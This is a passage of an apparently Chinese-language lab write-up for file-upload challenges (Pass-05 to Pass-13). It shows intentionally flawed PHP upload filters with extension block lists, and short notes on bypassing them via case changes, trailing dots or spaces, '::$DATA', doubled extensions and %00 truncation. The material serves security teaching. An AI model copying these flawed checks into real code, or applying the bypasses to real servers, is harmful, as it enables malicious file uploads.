title="pass"></a>pass</h4><p>pht</p><p>没有对文件名进行小写转换，所以大小写混合或者大写可以绕过 </p><h3 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="pass-5"><a href="#pass-5" class="headerlink" title="pass"></a>pass</h4><p>审计代码发现没有去处空格</p><p>利用Windows系统的文件名特性。文件名最后增加<strong>点和空格</strong>，写成<code>06.php.</code>，上传后保存在Windows系统上的文件名最后的一个<code>.</code>会被去掉，实际上保存的文件名就是<code>06.php</code> </p><p>pht</p><h3 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="pass-6"><a href="#pass-6" class="headerlink" title="pass"></a>pass</h4><p>审计代码发现没有删除结尾的<code>.</code></p><p>原理同Pass-07</p><p>文件名后加点，改成<code>07.php.</code></p><p>pht</p><h3 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="pass-7"><a href="#pass-7" class="headerlink" title="pass"></a>pass</h4><p>没有删除<code>$DATA</code></p><p>Windows文件流特性绕过，文件名改成<code>08.php::$DATA</code>，上传成功后保存的文件名其实是<code>08.php</code> </p><p>pht</p><h3 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>原理同Pass-06</strong>，上传文件名后加上<strong>点+空格+点</strong>，改为<code>09.php. .</code> </p><p>pht</p><h3 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name)) &#123;</span><br><span class="line">            $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键代码<code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p><p>当后缀名中出现黑名单列表中的内容时，就替换为空，所以可以用pphphp这样的后缀绕过。</p><p>pht</p><h3 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">'上传失败！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strrpos — 计算指定字符串在目标字符串中最后一次出现的位置</p><p>说明<a href="http://php.net/manual/zh/function.strrpos.php#refsect1-function.strrpos-description" target="_blank" rel="noopener"> ¶</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int strrpos ( string $haystack , string $needle [, int $offset = 0 ] )</span><br></pre></td></tr></table></figure><p>返回字符串 <code>haystack</code> 中 <code>needle</code> 最后一次出现的数字位置。注意 PHP4 中，needle 只能为单个字符。如果 needle 被指定为一个字符串，那么将仅使用第一个字符。</p><p>substr — 返回字符串的子串</p><p>说明<a href="http://php.net/manual/zh/function.substr.php#refsect1-function.substr-description" target="_blank" rel="noopener"> ¶</a></p><p>string <strong>substr</strong> ( string <code>$string</code> , int <code>$start</code> [, int <code>$length</code> ] )</p><p>返回字符串 <code>string</code> 由 <code>start</code> 和 <code>length</code> 参数指定的子字符串。</p><h4 id="pass-8"><a href="#pass-8" class="headerlink" title="pass"></a>pass</h4><p>%00截断</p><p>原理：</p><p>截断的核心，就是<code>chr(0)</code>这个字符  </p><p> 先说一下这个字符，这个字符不为空(Null)，也不是空字符(“”)，更不是空格！  </p><p> 当程序在输出含有<code>chr(0)</code>变量时，<code>chr(0)</code>后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致漏洞产生  </p><p>0x00，%00，/00之类 的也是一样的</p><p><a href="https://www.cnblogs.com/milantgh/p/3612978.html" target="_blank" rel="noopener">https://www.cnblogs.com/milantgh/p/3612978.html</a></p><p><a href="https://www.cnblogs.com/hack0ne/p/4603144.html" target="_blank" rel="noopener">https://www.cnblogs.com/hack0ne/p/4603144.html</a></p><h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>%00截断</p><h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = $UPLOAD_ADDR.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 